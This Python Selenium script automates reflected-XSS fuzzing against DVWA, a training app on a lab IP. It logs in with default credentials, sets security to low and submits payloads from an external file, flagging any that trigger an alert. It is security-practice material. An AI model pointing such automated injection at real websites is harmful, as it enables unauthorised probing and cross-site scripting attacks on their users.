from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.common.exceptions import WebDriverException
import time 

# Initialize WebDriver
options = FirefoxOptions()
service = FirefoxService(executable_path='/usr/local/bin/geckodriver')  # Update path if needed
driver = webdriver.Firefox(service=service, options=options)

# Function to read payloads from file
def read_payloads_file(filename):
    payloads = []
    with open(filename, 'r') as file:
        for line in file:
            payload = line.strip()
            payloads.append(payload)
    return payloads

# Read XSS payloads from file
payload_file_path = 'xss_payloads_10000.txt'
xss_payloads = read_payloads_file(payload_file_path)

try:
    # Navigate to DVWA login page
    driver.get("http://192.168.159.129/dvwa/")

    # Log in
    username = 'admin'
    password = 'password'

    WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.NAME, 'username')))
    username_field = driver.find_element(By.NAME, 'username')
    password_field = driver.find_element(By.NAME, 'password')

    username_field.send_keys(username)
    password_field.send_keys(password)

    login_button = driver.find_element(By.NAME, 'Login')
    login_button.click()

    # Set security level to low
    driver.get("http://192.168.159.129/dvwa/security.php")
    WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.NAME, 'security')))

    select_element = driver.find_element(By.NAME, 'security')
    select = Select(select_element)
    select.select_by_value('low')

    submit_button = driver.find_element(By.NAME, 'seclev_submit')
    submit_button.click()

    # Navigate to XSS (Reflected) vulnerability page
    driver.get("http://192.168.159.129/dvwa/vulnerabilities/xss_r/")

    for xss_payload in xss_payloads:
        # Attempt to inject the XSS payload
        try:
            WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.NAME, 'name')))
            input_field = driver.find_element(By.NAME, 'name')
            input_field.send_keys(xss_payload)

            submit_button = driver.find_element(By.XPATH, '//input[@value="Submit"]')
            submit_button.click()

            # Check if the XSS payload executed
            alert = WebDriverWait(driver, 20).until(EC.alert_is_present())
            if alert:
                print(f"XSS vulnerability detected with payload: {xss_payload}")
                alert.accept()

        except WebDriverException as e:
            print(f"An error occurred with payload {xss_payload}: {e}")
        

finally:
    driver.quit()
